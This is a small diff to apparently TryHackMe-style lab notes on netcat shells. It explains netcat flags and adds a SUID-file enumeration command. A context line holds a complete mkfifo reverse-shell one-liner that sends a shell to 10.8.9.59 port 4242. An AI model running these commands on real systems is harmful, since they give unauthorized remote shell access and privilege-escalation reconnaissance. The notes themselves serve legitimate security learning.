@@ -33,6 +33,7 @@
 - `-n` tells netcat not to resolve host names or use DNS. Explaining this is outwith the scope of the room.
 - `-p `indicates that the port specification will follow.
 - `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.9.59 4242 >/tmp/f`
+- `find / -user root -perm -4000 -exec ls -ldb {} \;`
 
 ### Bind Shells
 
